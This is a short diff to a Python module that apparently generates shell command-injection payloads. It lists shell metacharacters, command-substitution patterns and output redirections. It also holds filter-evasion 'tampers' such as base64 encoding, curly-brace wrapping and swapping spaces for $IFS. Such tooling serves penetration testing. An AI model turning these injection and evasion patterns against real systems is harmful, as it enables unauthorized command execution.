@@ -4,23 +4,19 @@ from raycharles.tampers import *
 
 PayloadGenerator = Callable[[str], str]
 
-COMMENT_CHARS = ("#",)
-META_CHARS = ("&&", "||", "&", "|", ";")
-QUOTE_CHARS = ("'", '"')
+ENDINGS               = (">/dev/null", "2>/dev/null")
+META_CHARS            = ("&&", "||", "&", "|", ";")
+QUOTE_CHARS           = ("'", '"')
+COMMENT_CHARS         = ("#",)
 SUBSTITUTION_PATTERNS = ("$(%(cmd)s)", "`%(cmd)s`")
-ENDINGS = (">/dev/null", "2>/dev/null")
 
 
-def build_payloads(
-    pre_tampers=[
-        encapsulate_into_curly_braces,
-        encode_base64,
-    ],
-    tampers=[
-        add_dollar_and_ats,
-        replace_spaces_with_ifs,
-    ],
+def build_payload_generators(
+    pre_tampers=[encapsulate_into_curly_braces, encode_base64],
+    tampers=[add_dollar_and_ats, replace_spaces_with_ifs],
 ) -> Generator[PayloadGenerator, None, None]:
+    """ Build payload generators """
+
     tampers.append(lambda x: x)
     pre_tampers.append(lambda x: x)
 
